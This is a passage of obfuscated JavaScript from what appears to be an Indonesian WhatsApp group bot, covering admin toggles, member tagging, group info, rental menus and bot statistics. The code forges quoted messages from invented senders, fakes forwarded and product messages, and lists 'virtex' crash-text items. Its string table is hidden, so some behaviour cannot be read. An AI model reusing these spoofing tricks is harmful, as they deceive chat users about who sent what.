_0x39f6c9(0x1ab):if(!isRegistered)return sendButtonNotRegis(from,daftar1,daftar2,daftar3,{'quoted':mek,'contextInfo':{'mentionedJid':[numbernye,ow,player]}});if(isBanned)return replysticker(banstc);if(!isGroup)return replysticker(grupstc);if(!isBotGroupAdmins)return replysticker(botadmstc);if(!isGroupAdmins&&!isOwner)return replysticker(adminstc);if(!isPremium)return replysticker(premiumstc);if(checkLimituser(sender)<=0x0)return reply(ind[_0x39f6c9(0xf8)]());const mode134s3d1=[{'buttonId':_0x39f6c9(0xf9),'buttonText':{'displayText':'ON'},'type':0x1},{'buttonId':_0x39f6c9(0x281),'buttonText':{'displayText':_0x39f6c9(0xa2)},'type':0x1}];await sendButtonText(from,_0x39f6c9(0x2aa),buttonsmenu1,mode134s3d1,{'quoted':mek,'contextInfo':{'mentionedJid':[numbernye,ow,player]}}),await confirmLIMIT(sender,[angka]);break;case'Welcome':if(!isRegistered)return sendButtonNotRegis(from,daftar1,daftar2,daftar3,{'quoted':mek,'contextInfo':{'mentionedJid':[numbernye,ow,player]}});if(isBanned)return replysticker(banstc);if(!isGroup)return replysticker(grupstc);if(!isBotGroupAdmins)return replysticker(botadmstc);if(!isGroupAdmins&&!isOwner)return replysticker(adminstc);if(!isPremium)return replysticker(premiumstc);if(checkLimituser(sender)<=0x0)return reply(ind[_0x39f6c9(0xf8)]());const mode134ssd31=[{'buttonId':_0x39f6c9(0x2b9),'buttonText':{'displayText':'ON'},'type':0x1},{'buttonId':_0x39f6c9(0x2bb),'buttonText':{'displayText':_0x39f6c9(0xa2)},'type':0x1}];await sendButtonText(from,_0x39f6c9(0x2aa),buttonsmenu1,mode134ssd31,{'quoted':mek,'contextInfo':{'mentionedJid':[numbernye,ow,player]}}),await confirmLIMIT(sender,[angka]);break;case'Anti\x20Virtex':if(!isRegistered)return sendButtonNotRegis(from,daftar1,daftar2,daftar3,{'quoted':mek,'contextInfo':{'mentionedJid':[numbernye,ow,player]}});if(isBanned)return replysticker(banstc);if(!isGroup)return replysticker(grupstc);if(!isBotGroupAdmins)return replysticker(botadmstc);if(!isGroupAdmins&&!isOwner)return replysticker(adminstc);if(!isPremium)return replysticker(premiumstc);if(checkLimituser(sender)<=0x0)return reply(ind[_0x39f6c9(0xf8)]());const mode134as31=[{'buttonId':'antivirtex\x20on','buttonText':{'displayText':'ON'},'type':0x1},{'buttonId':_0x39f6c9(0xff),'buttonText':{'displayText':_0x39f6c9(0xa2)},'type':0x1}];await sendButtonText(from,_0x39f6c9(0x2aa),buttonsmenu1,mode134as31,{'quoted':mek,'contextInfo':{'mentionedJid':[numbernye,ow,player]}}),await confirmLIMIT(sender,[angka]);break;case _0x39f6c9(0x295):if(!isRegistered)return sendButtonNotRegis(from,daftar1,daftar2,daftar3,{'quoted':mek,'contextInfo':{'mentionedJid':[numbernye,ow,player]}});if(isBanned)return replysticker(banstc);if(!isGroup)return replysticker(grupstc);if(!isBotGroupAdmins)return replysticker(botadmstc);if(!isGroupAdmins&&!isOwner)return replysticker(adminstc);if(!isPremium)return replysticker(premiumstc);if(checkLimituser(sender)<=0x0)return reply(ind[_0x39f6c9(0xf8)]());if(args[_0x39f6c9(0x2cb)]<0x1)return reply(_0x39f6c9(0xeb)+prefix+command+'\x20on\x20atau\x20'+prefix+command+'\x20off\x20```');if(checkLimituser(sender)<=0x0)return reply(ind[_0x39f6c9(0xf8)]());const mode134s31da=[{'buttonId':'antitoxic\x20on','buttonText':{'displayText':'ON'},'type':0x1},{'buttonId':'antitoxic\x20off','buttonText':{'displayText':_0x39f6c9(0xa2)},'type':0x1}];await sendButtonText(from,'_Pilih\x20Mode\x20Di\x20Bawah\x20Ini_',buttonsmenu1,mode134s31da,{'quoted':mek,'contextInfo':{'mentionedJid':[numbernye,ow,player]}}),await confirmLIMIT(sender,[angka]);break;case _0x39f6c9(0xd1):if(!isRegistered)return sendButtonNotRegis(from,daftar1,daftar2,daftar3,{'quoted':mek,'contextInfo':{'mentionedJid':[numbernye,ow,player]}});if(isBanned)return replysticker(banstc);if(!isGroup)return replysticker(grupstc);if(!isBotGroupAdmins)return replysticker(botadmstc);if(!isGroupAdmins&&!isOwner)return replysticker(adminstc);if(!isPremium)return replysticker(premiumstc);if(checkLimituser(sender)<=0x0)return reply(ind[_0x39f6c9(0xf8)]());const mode134s31sd=[{'buttonId':_0x39f6c9(0x278),'buttonText':{'displayText':_0x39f6c9(0x1ca)},'type':0x1},{'buttonId':_0x39f6c9(0x181),'buttonText':{'displayText':'CLOSE'},'type':0x1}];await sendButtonText(from,_0x39f6c9(0x2aa),buttonsmenu1,mode134s31sd,{'quoted':mek,'contextInfo':{'mentionedJid':[numbernye,ow,player]}}),await confirmLIMIT(sender,[angka]);break;case'Revoke':if(!isRegistered)return sendButtonNotRegis(from,daftar1,daftar2,daftar3,{'quoted':mek,'contextInfo':{'mentionedJid':[numbernye,ow,player]}});if(isBanned)return replysticker(banstc);if(!isGroup)return replysticker(grupstc);if(!isBotGroupAdmins)return replysticker(botadmstc);if(!isGroupAdmins&&!isOwner)return replysticker(adminstc);if(!isPremium)return replysticker(premiumstc);if(checkLimituser(sender)<=0x0)return reply(ind[_0x39f6c9(0xf8)]());client[_0x39f6c9(0x130)](from),fakegroup(_0x39f6c9(0x2c0)),await confirmLIMIT(sender,[angka]);break;case'List\x20Admin':if(!isRegistered)return sendButtonNotRegis(from,daftar1,daftar2,daftar3,{'quoted':mek,'contextInfo':{'mentionedJid':[numbernye,ow,player]}});if(isBanned)return replysticker(banstc);if(!isGroup)return replysticker(grupstc);if(!isGroupAdmins&&!isOwner)return replysticker(adminstc);if(checkLimituser(sender)<=0x0)return reply(ind['limitend']());teks=_0x39f6c9(0x13f)+groupMetadata[_0x39f6c9(0xb9)]+_0x39f6c9(0x1fd)+groupAdmins[_0x39f6c9(0x2cb)]+_0x39f6c9(0x261),no=0x0;for(let admon of groupAdmins){no+=0x1,teks+='['+no['toString']()+_0x39f6c9(0x2d3)+admon[_0x39f6c9(0x15b)]('@')[0x0]+'\x0a';}mentions(teks,groupAdmins,!![]),await confirmLIMIT(sender,[angka]);break;case _0x39f6c9(0x12b):if(!isRegistered)return sendButtonNotRegis(from,daftar1,daftar2,daftar3,{'quoted':mek,'contextInfo':{'mentionedJid':[numbernye,ow,player]}});if(isBanned)return replysticker(banstc);if(!isGroup)return replysticker(grupstc);if(!isGroupAdmins&&!isOwner)return replysticker(adminstc);if(checkLimituser(sender)<=0x0)return reply(ind[_0x39f6c9(0xf8)]());client[_0x39f6c9(0x2c1)](from,Presence[_0x39f6c9(0x2ba)]),ppUrl=await client[_0x39f6c9(0x270)](from),buffergbl=await getBuffer(ppUrl),client[_0x39f6c9(0x208)](from,buffergbl,image,{'quoted':mek,'thumbnail':Buffer['alloc'](0x0),'caption':_0x39f6c9(0x2b8)+groupName+'\x0a*➣\x20MEMBER*\x20:\x20'+groupMembers[_0x39f6c9(0x2cb)]+'\x0a*➣\x20ADMIN*\x20:\x20'+groupAdmins[_0x39f6c9(0x2cb)]+'\x0a*➣\x20DESK*:\x20'+groupDesc}),await confirmLIMIT(sender,[angka]);break;case _0x39f6c9(0x141):if(!isRegistered)return sendButtonNotRegis(from,daftar1,daftar2,daftar3,{'quoted':mek,'contextInfo':{'mentionedJid':[numbernye,ow,player]}});if(isBanned)return replysticker(banstc);if(!isGroup)return replysticker(grupstc);if(!isGroupAdmins&&!isOwner)return replysticker(adminstc);if(checkLimituser(sender)<=0x0)return reply(ind[_0x39f6c9(0xf8)]());let ido=args&&/\d+\-\d+@g.us/[_0x39f6c9(0x2db)](args[0x0])?args[0x0]:from,online=[...Object[_0x39f6c9(0xbd)](client[_0x39f6c9(0xb7)][_0x39f6c9(0x29a)](ido)['presences']),client['user'][_0x39f6c9(0x11b)]];client['sendMessage'](from,_0x39f6c9(0x2a9)+online[_0x39f6c9(0x2d9)](_0x4dfe05=>_0x39f6c9(0x20f)+_0x4dfe05[_0x39f6c9(0x2a7)](/@.+/,''))[_0x39f6c9(0x19d)]`\n`,text,{'quoted':mek,'contextInfo':{'mentionedJid':online}}),await confirmLIMIT(sender,[angka]);break;case _0x39f6c9(0x116):if(!isRegistered)return sendButtonNotRegis(from,daftar1,daftar2,daftar3,{'quoted':mek,'contextInfo':{'mentionedJid':[numbernye,ow,player]}});if(!isGroup)return replysticker(grupstc);if(!isBotGroupAdmins)return replysticker(botadmstc);if(!isGroupAdmins&&!isOwner)return replysticker(adminstc);if(checkLimituser(sender)<=0x0)return reply(ind[_0x39f6c9(0xf8)]());linkgc=await client[_0x39f6c9(0xc0)](from),yeh=_0x39f6c9(0xa3)+linkgc+_0x39f6c9(0x2c6)+groupName+'*',client['sendMessage'](from,yeh,text,{'quoted':fgif}),await confirmLIMIT(sender,[angka]);break;case _0x39f6c9(0x2b7):if(!isRegistered)return sendButtonNotRegis(from,daftar1,daftar2,daftar3,{'quoted':mek,'contextInfo':{'mentionedJid':[numbernye,ow,player]}});if(isBanned)return replysticker(banstc);if(!isGroup)return replysticker(grupstc);if(!isOwner&&!isGroupAdmins)return replysticker(adminstc);if(!isPremium&&!isOwner)return replysticker(premiumstc);if(checkLimituser(sender)<=0x0)return reply(ind[_0x39f6c9(0xf8)]());members_id=[],teks=args[_0x39f6c9(0x2cb)]>0x1?body[_0x39f6c9(0x24a)](0x8)['trim']():'',teks+='\x0a\x0a';for(let mem of groupMembers){teks+=_0x39f6c9(0x296)+mem[_0x39f6c9(0x11b)][_0x39f6c9(0x15b)]('@')[0x0]+'\x0a',members_id[_0x39f6c9(0x230)](mem['jid']);}mentions(teks,members_id,!![]),await confirmLIMIT(sender,[angka]);break;case _0x39f6c9(0x1d3):if(!isRegistered)return sendButtonNotRegis(from,daftar1,daftar2,daftar3,{'quoted':mek,'contextInfo':{'mentionedJid':[numbernye,ow,player]}});if(isBanned)return replysticker(banstc);if(!isGroup)return replysticker(grupstc);if(!isOwner&&!isGroupAdmins)return replysticker(adminstc);if(!isPremium&&!isOwner)return replysticker(premiumstc);if(checkLimituser(sender)<=0x0)return reply(ind['limitend']());var value=args[_0x39f6c9(0x19d)]('\x20'),group=await client[_0x39f6c9(0x25c)](from),member=group[_0x39f6c9(0x136)],mem=[];member['map'](async _0x2d7e5f=>{const _0x31f335=_0x39f6c9;mem[_0x31f335(0x230)](_0x2d7e5f['id']['replace'](_0x31f335(0x229),'s.whatsapp.net'));});var optionshidetag={'text':value,'contextInfo':{'mentionedJid':mem},'quoted':mek};client[_0x39f6c9(0x208)](from,optionshidetag,text,{'quoted':{'key':{'fromMe':![],'participant':_0x39f6c9(0x1ee),...from?{'remoteJid':_0x39f6c9(0x111)}:{}},'message':{'imageMessage':{'url':_0x39f6c9(0xc5),'mimetype':_0x39f6c9(0xca),'caption':fake,'fileSha256':_0x39f6c9(0x25d),'fileLength':_0x39f6c9(0x12e),'height':0x438,'width':0x437,'mediaKey':_0x39f6c9(0x161),'fileEncSha256':_0x39f6c9(0x14d),'directPath':_0x39f6c9(0x266),'mediaKeyTimestamp':_0x39f6c9(0x1c5),'jpegThumbnail':WMthumb}}}}),await confirmLIMIT(sender,[angka]);break;case _0x39f6c9(0x2d7):if(!isRegistered)return sendButtonNotRegis(from,daftar1,daftar2,daftar3,{'quoted':mek,'contextInfo':{'mentionedJid':[numbernye,ow,player]}});if(isBanned)return replysticker(banstc);if(!isGroup)return replysticker(grupstc);const grouprows1=[{'title':_0x39f6c9(0xdb),'description':_0x39f6c9(0x1c7),'rowId':'\x20'},{'title':_0x39f6c9(0x25a),'description':_0x39f6c9(0x191),'rowId':'\x20'},{'title':_0x39f6c9(0x295),'description':_0x39f6c9(0x101),'rowId':'\x20'},{'title':'Anti\x20Virtex','description':_0x39f6c9(0x207),'rowId':'\x20'},{'title':_0x39f6c9(0x1ab),'description':_0x39f6c9(0x207),'rowId':'\x20'},{'title':_0x39f6c9(0xd1),'description':'Fitur\x20Group','rowId':'\x20'},{'title':_0x39f6c9(0x2b7),'description':_0x39f6c9(0x21f),'rowId':'\x20'},{'title':_0x39f6c9(0x1d3),'description':_0x39f6c9(0x2c8),'rowId':'\x20'},{'title':_0x39f6c9(0x2ab),'description':_0x39f6c9(0x122),'rowId':'\x20'},{'title':'Revoke','description':'Ubah\x20Link\x20Group','rowId':'\x20'},{'title':'Link\x20Group','description':'Link\x20Group\x20Sekarang','rowId':'\x20'},{'title':_0x39f6c9(0x12b),'description':_0x39f6c9(0x2ac),'rowId':'\x20'},{'title':_0x39f6c9(0x141),'description':'Member\x20Yang\x20Online\x20Saat\x20ini','rowId':'\x20'}],sectionsgroup1=[{'title':_0x39f6c9(0x2d7),'rows':grouprows1}],butaninigroup1={'buttonText':'Click\x20Me!','footerText':ind[_0x39f6c9(0x188)](prefix,dev,numbernye),'description':'*'+hahh+'\x20@'+player[_0x39f6c9(0x15b)]('@')[0x0]+_0x39f6c9(0x23f),'sections':sectionsgroup1,'listType':0x1};client[_0x39f6c9(0x208)](from,butaninigroup1,MessageType['listMessage'],{'quoted':ftoko,'contextInfo':{'mentionedJid':[player,numbernye,ow,dev],'externalAdReply':{'title':hahh+_0x39f6c9(0x1db),'body':''+fakereply,'previewType':_0x39f6c9(0x174),'thumbnailUrl':'\x20','thumbnail':WMthumb,'sourceUrl':''+mybio}}});break;case _0x39f6c9(0x1c8):if(isBanned)return replysticker(banstc);if(!isRegistered)return sendButtonNotRegis(from,daftar1,daftar2,daftar3,{'quoted':mek,'contextInfo':{'mentionedJid':[numbernye,ow,player]}});if(isGroup)return reply(_0x39f6c9(0x16b));const annonyrows1=[{'title':'Start','description':'\x20','rowId':'\x20'},{'title':_0x39f6c9(0xc6),'description':'\x20','rowId':'\x20'}],sectionsanonny1=[{'title':_0x39f6c9(0xd6),'rows':annonyrows1}],butaniaonu1={'buttonText':_0x39f6c9(0x209),'footerText':ind[_0x39f6c9(0xee)](prefix,dev,numbernye),'description':'*'+hahh+'\x20@'+player[_0x39f6c9(0x15b)]('@')[0x0]+_0x39f6c9(0x23f),'sections':sectionsanonny1,'listType':0x1};client['sendMessage'](from,butaniaonu1,MessageType[_0x39f6c9(0xa1)],{'quoted':ftoko,'contextInfo':{'mentionedJid':[player,numbernye,ow,dev],'externalAdReply':{'title':hahh+_0x39f6c9(0x1db),'body':''+fakereply,'previewType':'PHOTO','thumbnailUrl':'\x20','thumbnail':WMthumb,'sourceUrl':''+mybio}}});break;case _0x39f6c9(0xaf):case'Owner':if(!isRegistered)return sendButtonNotRegis(from,daftar1,daftar2,daftar3,{'quoted':mek,'contextInfo':{'mentionedJid':[numbernye,ow,player]}});if(isBanned)return replysticker(banstc);client[_0x39f6c9(0x208)](from,{'displayName':_0x39f6c9(0x244),'contacts':contrii},_0x39f6c9(0x13a),{'quoted':mek});break;case _0x39f6c9(0x2ad):case _0x39f6c9(0x2a4):case _0x39f6c9(0x2d8):if(!isRegistered)return sendButtonNotRegis(from,daftar1,daftar2,daftar3,{'quoted':mek,'contextInfo':{'mentionedJid':[numbernye,ow,player]}});if(isBanned)return replysticker(banstc);client[_0x39f6c9(0x208)](from,{'displayName':_0x39f6c9(0x180),'contacts':contri1},_0x39f6c9(0x13a),{'quoted':mek});break;case _0x39f6c9(0x1d4):if(!isRegistered)return sendButtonNotRegis(from,daftar1,daftar2,daftar3,{'quoted':mek,'contextInfo':{'mentionedJid':[numbernye,ow,player]}});if(isBanned)return replysticker(banstc);sendButtonImageLoc(from,_0x39f6c9(0x19e)+github,buttonsmenu1,buttonsmenu2,{'quoted':mek,'contextInfo':{'mentionedJid':[player,numbernye,ow,dev]}});break;case _0x39f6c9(0x16a):case _0x39f6c9(0xd9):if(!isRegistered)return sendButtonNotRegis(from,daftar1,daftar2,daftar3,{'quoted':mek,'contextInfo':{'mentionedJid':[numbernye,ow,player]}});if(isBanned)return replysticker(banstc);sendButtonImageLoc(from,'*'+hahh+'\x20@'+player['split']('@')[0x0]+'*',ind[_0x39f6c9(0xf2)](player,hahh,dev,numbernye),buttonsmenu2,{'quoted':mek,'contextInfo':{'mentionedJid':[player,numbernye,ow,dev]}});break;case _0x39f6c9(0x258):if(!isRegistered)return sendButtonNotRegis(from,daftar1,daftar2,daftar3,{'quoted':mek,'contextInfo':{'mentionedJid':[numbernye,ow,player]}});if(isBanned)return replysticker(banstc);sendButtonImageLoc(from,'*'+hahh+'\x20@'+player['split']('@')[0x0]+'*',ind['gcofficial'](player,hahh,dev,numbernye),buttonsmenu2,{'quoted':mek,'contextInfo':{'mentionedJid':[player,numbernye,ow,dev]}});break;case _0x39f6c9(0xde):if(!isRegistered)return sendButtonNotRegis(from,daftar1,daftar2,daftar3,{'quoted':mek,'contextInfo':{'mentionedJid':[numbernye,ow,player]}});if(isBanned)return replysticker(banstc);sendButtonImageLoc(from,'Silahkan\x20Hubungin\x20Owner\x20Luc\x20Bot\x20Untuk\x20Informasi\x20Lebih\x20Lanjut',buttonsmenu1,buttonsmenu3,{'quoted':mek,'contextInfo':{'mentionedJid':[player,numbernye,ow,dev]}});break;case _0x39f6c9(0xb8):if(!isRegistered)return sendButtonNotRegis(from,daftar1,daftar2,daftar3,{'quoted':mek,'contextInfo':{'mentionedJid':[numbernye,ow,player]}});if(isBanned)return replysticker(banstc);if(args[_0x39f6c9(0x2cb)]<0x1)return reply(_0x39f6c9(0x2c2)+prefix+_0x39f6c9(0x1cc));break;case _0x39f6c9(0x1a2):if(isBanned)return replysticker(banstc);if(!isRegistered)return sendButtonNotRegis(from,daftar1,daftar2,daftar3,{'quoted':mek,'contextInfo':{'mentionedJid':[numbernye,ow,player]}});const sewamenu1=[{'title':'VIP','description':_0x39f6c9(0xda),'rowId':_0x39f6c9(0x15c)}],sewamenu4=[{'title':'1\x20Hari','description':_0x39f6c9(0x283),'rowId':_0x39f6c9(0x16d)}],sewamenu2=[{'title':_0x39f6c9(0x17a),'description':_0x39f6c9(0xfb),'rowId':_0x39f6c9(0x16d)}],sewamenu3=[{'title':_0x39f6c9(0xc2),'description':_0x39f6c9(0x1a9),'rowId':_0x39f6c9(0x2d8)}],sewamenu5=[{'title':_0x39f6c9(0xae),'description':'Chat\x20Owner\x20Jika\x20Kamu\x20Perlu','rowId':_0x39f6c9(0xb5)}],sewamenu6=[{'title':_0x39f6c9(0xd9),'description':_0x39f6c9(0x200),'rowId':_0x39f6c9(0xfc)}],sewamenu7=[{'title':_0x39f6c9(0x186),'description':_0x39f6c9(0x175),'rowId':_0x39f6c9(0x1d2)}],sectionssewas=[{'title':_0x39f6c9(0x18d),'rows':sewamenu1},{'title':_0x39f6c9(0x2d1),'rows':sewamenu2},{'title':_0x39f6c9(0x113),'rows':sewamenu3},{'title':'Jadi\x20Bot','rows':sewamenu7},{'title':'Trial','rows':sewamenu4},{'title':_0x39f6c9(0xae),'rows':sewamenu5},{'title':_0x39f6c9(0xd9),'rows':sewamenu6}],buttonssewaas={'buttonText':'List\x20Harga\x20Sewa','footerText':ind[_0x39f6c9(0x2b4)](prefix,dev,numbernye),'description':'*'+hahh+'\x20@'+player['split']('@')[0x0]+_0x39f6c9(0x23f),'sections':sectionssewas,'listType':0x1};client[_0x39f6c9(0x208)](from,buttonssewaas,MessageType[_0x39f6c9(0xa1)],{'caption':fake,'contextInfo':{'text':'hi','forwardingScore':0x3b9aca00,'isForwarded':!![],'sendEphemeral':!![],'mentionedJid':[dev,ow,numbernye,player]},'quoted':ftoko,'sendEphemeral':!![]});break;case'BotStat':if(!isRegistered)return sendButtonNotRegis(from,daftar1,daftar2,daftar3,{'quoted':mek,'contextInfo':{'mentionedJid':[numbernye,ow,player]}});if(isBanned)return replysticker(banstc);anu=process[_0x39f6c9(0x2c9)](),teks=_0x39f6c9(0x1a1)+hahh+'*\x20\x20@'+player[_0x39f6c9(0x15b)]('@')[0x0]+'\x0a*TANGGAL\x20:*\x20\x20'+timu+_0x39f6c9(0x11d)+wib+_0x39f6c9(0x203)+wita+_0x39f6c9(0x2b6)+wit+_0x39f6c9(0x13b)+client[_0x39f6c9(0x2a0)][0x0]+'\x0a*Server\x20:*\x20\x20'+client[_0x39f6c9(0x2a0)][0x1]+_0x39f6c9(0x26a)+prefix+_0x39f6c9(0x131)+botver+_0x39f6c9(0x1eb)+battery[_0x39f6c9(0x15a)]+_0x39f6c9(0xdf)+(battery[_0x39f6c9(0x242)]==!![]?_0x39f6c9(0x153):_0x39f6c9(0x13c))+_0x39f6c9(0x117)+device_manufacturer+_0x39f6c9(0x27b)+os_version+'\x0a*RAM\x20:*\x20'+(process['memoryUsage']()[_0x39f6c9(0x1b8)]/0x400/0x400)[_0x39f6c9(0x160)](0x2)+_0x39f6c9(0x29c)+Math[_0x39f6c9(0x15f)](require('os')[_0x39f6c9(0x140)]/0x400/0x400)+_0x39f6c9(0x1e6)+device_model+'\x0a*MCC\x20:*\x20\x20'+mcc+_0x39f6c9(0x206)+mnc+_0x39f6c9(0x128)+dev[_0x39f6c9(0x15b)]('@')[0x0]+'\x0a*Owner\x20:*\x20\x20@'+ow[_0x39f6c9(0x15b)]('@')[0x0]+_0x39f6c9(0x14f)+wa_version+_0x39f6c9(0x1c6)+blocked[_0x39f6c9(0x2cb)]+'\x20Blocked\x0a*Group\x20Chat\x20:*\x20\x20'+totalgroup[_0x39f6c9(0x2cb)]+_0x39f6c9(0x2d2)+totalkontak['length']+_0x39f6c9(0x142)+totalchat['length']+_0x39f6c9(0xba)+_registered[_0x39f6c9(0x2cb)]+'\x0a*Hit\x20Today\x20:*\x20\x20'+luchit+'\x20Hit\x0a*Total\x20Hit\x20:*\x20\x20'+totalhit+_0x39f6c9(0x1e0)+latensii[_0x39f6c9(0x160)](0x4)+_0x39f6c9(0xb1)+kyun(anu)+'\x0a\x0a*'+(banChats?_0x39f6c9(0x205):_0x39f6c9(0x247))+'*',sendButtonImageLoc(from,teks,buttonsmenu1,buttonsmenu2,{'quoted':mek,'contextInfo':{'mentionedJid':[player,numbernye,ow,dev]}});break;case _0x39f6c9(0x18d):case _0x39f6c9(0x213):case'1\x20Bulan':case'1\x20Minggu':case _0x39f6c9(0x1bf):case _0x39f6c9(0x186):if(!isRegistered)return sendButtonNotRegis(from,daftar1,daftar2,daftar3,{'quoted':mek,'contextInfo':{'mentionedJid':[numbernye,ow,player]}});if(isBanned)return replysticker(banstc);sendButtonImageLoc(from,_0x39f6c9(0x19c),buttonsmenu1,buttonsmenu3,{'quoted':mek,'contextInfo':{'mentionedJid':[player,numbernye,ow,dev]}});break;}function _0x124b(_0x46099c,_0x2f75e8){const _0x576477=_0x5764();return _0x124b=function(_0x124bbe,_0x470368){_0x124bbe=_0x124bbe-0xa0;let _0x38310c=_0x576477[_0x124bbe];return _0x38310c;},_0x124b(_0x46099c,_0x2f75e8);}switch(command){case _0x39f6c9(0x133):case _0x39f6c9(0x236):case _0x39f6c9(0x20a):if(!isRegistered)return sendButtonNotRegis(from,daftar1,daftar2,daftar3,{'quoted':mek,'contextInfo':{'mentionedJid':[numbernye,ow,player]}});if(isBanned)return replysticker(banstc);uhu='*'+hahh+'\x20@'+player[_0x39f6c9(0x15b)]('@')[0x0]+'*',Sendbutdocument(from,uhu,_0x39f6c9(0x279)+fake+_0x39f6c9(0xc8)+ow[_0x39f6c9(0x15b)]('@')[0x0]+_0x39f6c9(0x243)+fake+'.\x0aDiharapkan\x20untuk\x20tidak\x20menelpon\x20ke\x20nomor\x20ini,tidak\x20mintak\x20save\x20dan\x20tidak\x20spam\x20dalam\x20penggunaan\x20bot.ketik\x20#simplemenu',fs[_0x39f6c9(0x1cb)](_0x39f6c9(0x1f2)),{'mimetype':Mimetype[_0x39f6c9(0x211)],'thumbnail':ppmenukuku,'filename':''+fakereply,'pageCount':0x270f},[{'buttonId':'simplemenu','buttonText':{'displayText':_0x39f6c9(0x1b4)},'type':0x1},{'buttonId':'owner','buttonText':{'displayText':_0x39f6c9(0xae)},'type':0x1},{'buttonId':_0x39f6c9(0x237),'buttonText':{'displayText':_0x39f6c9(0x271)},'type':0x1}],{'quoted':ftoko,'contextInfo':{'mentionedJid':[ow,player,dev,numbernye],'sendEphemeral':!![],'externalAdReply':{'title':''+fakereply,'mediaType':'2','thumbnail':ppmenukuku,'mediaUrl':'https://www.youtube.com/watch?v=sfAy8TH-q-E'}}});break;case'testnewmenu':if(isBanned)return replysticker(banstc);if(!isRegistered){if(!isRegistered)return sendButtonNotRegis(from,daftar1,daftar2,daftar3,{'quoted':mek,'contextInfo':{'mentionedJid':[numbernye,ow,player]}});}if(!isOwner)return replysticker(ownerstc);buf=WMthumb,imeu=await client[_0x39f6c9(0x139)](_0x39f6c9(0x1ee),buf,image,{'thumbnail':Buffer[_0x39f6c9(0xbf)](0x0)}),imeg=imeu['message'][_0x39f6c9(0x164)],res=await client[_0x39f6c9(0x210)](from,{'productMessage':{'product':{'productImage':imeg,'productId':'150453297177375','title':'*'+hahh+'\x20@'+player[_0x39f6c9(0x15b)]('@')[0x0]+'*\x0a*Bot\x20ini\x20di\x20lengkapi\x20Anti-Spam\x20jadi\x20beri\x20jeda\x205\x20detik*','description':ind[_0x39f6c9(0xa9)](prefix,dev,numbernye),'currencyCode':'IDR','priceAmount1000':_0x39f6c9(0x294),'productImageCount':0x1},'businessOwnerJid':_0x39f6c9(0x2b2),'contextInfo':{'forwardingScore':0x3,'isForwarded':!![]}}},{'quoted':mek,'contextInfo':{'sendEphemeral':!![],'mentionedJid':[player,numbernye,ow,dev]}}),client[_0x39f6c9(0x147)](res);break;case _0x39f6c9(0x255):if(!isRegistered)return sendButtonNotRegis(from,daftar1,daftar2,daftar3,{'quoted':mek,'contextInfo':{'mentionedJid':[numbernye,ow,player]}});if(isBanned)return replysticker(banstc);if(mainmenu==![]){const sdadasf=[{'title':'Jok\x20GB','description':'','rowId':'\x20'},{'title':_0x39f6c9(0xe4),'description':'','rowId':'\x20'}],sectionsinfsadasfo2=[{'title':_0x39f6c9(0x2b0),'rows':sdadasf}],buttonsasaddinfo2={'buttonText':_0x39f6c9(0x209),'footerText':_0x39f6c9(0x135),'description':'*'+hahh+'\x20@'+player['split']('@')[0x0]+_0x39f6c9(0x23f),'sections':sectionsinfsadasfo2,'listType':0x1};client[_0x39f6c9(0x208)](from,buttonsasaddinfo2,MessageType[_0x39f6c9(0xa1)],{'quoted':ftoko,'contextInfo':{'mentionedJid':[player,numbernye,ow,dev],'externalAdReply':{'title':hahh+'\x20Owner\x20Tersayang','body':''+fakereply,'previewType':'PHOTO','thumbnailUrl':'\x20','thumbnail':WMthumb,'sourceUrl':''+mybio}}});}else(mainmenu=!![])&&sendButtonImageLoc(from,buttonsmenu5,ind[_0x39f6c9(0xdc)](prefix,dev,numbernye),buttonsmenu2,{'quoted':ftoko,'contextInfo':{'mentionedJid':[player,numbernye,ow,dev]}});break;case _0x39f6c9(0xdc):case _0x39f6c9(0x2af):if(!isRegistered)return sendButtonNotRegis(from,daftar1,daftar2,daftar3,{'quoted':mek,'contextInfo':{'mentionedJid':[numbernye,ow,player]}});if(isBanned)return replysticker(banstc);if(mainmenu==![]){const inforows2=[{'title':_0x39f6c9(0xae),'description':_0x39f6c9(0xaf),'rowId':'\x20'},{'title':'Source\x20Code','description':'Source\x20Code','rowId':'\x20'},{'title':_0x39f6c9(0x271),'description':_0x39f6c9(0xbc),'rowId':'\x20'},{'title':_0x39f6c9(0xd5),'description':_0x39f6c9(0xfd),'rowId':'\x20'},{'title':_0x39f6c9(0x138),'description':_0x39f6c9(0xc1),'rowId':'\x20'},{'title':_0x39f6c9(0xd9),'description':'Menampilkan\x20Peraturan\x20Bot','rowId':'\x20'},{'title':_0x39f6c9(0x10a),'description':_0x39f6c9(0x167),'rowId':'\x20'},{'title':_0x39f6c9(0x186),'description':_0x39f6c9(0xe8),'rowId':'\x20'},{'title':'Profile','description':_0x39f6c9(0x17d),'rowId':'\x20'},{'title':'Immune\x20Virtex','description':'Teks\x20Immune\x20Virtex','rowId':'\x20'}],inforows21=[{'title':_0x39f6c9(0x276),'description':_0x39f6c9(0x105),'rowId':'\x20'},{'title':_0x39f6c9(0x28b),'description':_0x39f6c9(0x287),'rowId':'\x20'},{'title':_0x39f6c9(0x2d0),'description':'Daftar\x20Block\x20Bot','rowId':'\x20'},{'title':_0x39f6c9(0x1f0),'description':_0x39f6c9(0x259),'rowId':'\x20'}],inforows1234=[{'title':'List\x20Vn','description':'List\x20Vn\x20Bot','rowId':'\x20'},{'title':_0x39f6c9(0xd2),'description':'List\x20Sticker\x20Bot','rowId':'\x20'},{'title':_0x39f6c9(0x226),'description':_0x39f6c9(0x1f8),'rowId':'\x20'},{'title':'List\x20Image','description':'List\x20Image\x20Bot','rowId':'\x20'}],sectionsinfo2=[{'title':'Storage','rows':inforows1234},{'title':_0x39f6c9(0xb2),'rows':inforows2},{'title':'List\x20Info','rows':inforows21}],buttoninfo2={'buttonText':_0x39f6c9(0x209),'footerText':ind[_0x39f6c9(0xdc)](prefix,dev,numbernye),'description':'*'+hahh+'\x20@'+player['split']('@')[0x0]+_0x39f6c9(0x23f),'sections':sectionsinfo2,'listType':0x1};client['sendMessage'](from,buttoninfo2,MessageType[_0x39f6c9(0xa1)],{'quoted':ftoko,'contextInfo':{'mentionedJid':[player,numbernye,ow,dev],'externalAdReply':{'title':hahh+_0x39f6c9(0x1db),'body':''+fakereply,'previewType':_0x39f6c9(0x174),'thumbnailUrl':'\x20','thumbnail':WMthumb,'sourceUrl':''+mybio}}});}else(mainmenu=!![])&&sendButtonImageLoc(from,buttonsmenu5,ind[_0x39f6c9(0xdc)](prefix,dev,numbernye),buttonsmenu2,{'quoted':ftoko,'contextInfo':{'mentionedJid':[player,numbernye,ow,dev]}});break;case _0x39f6c9(0xc4):case'sewabot':case 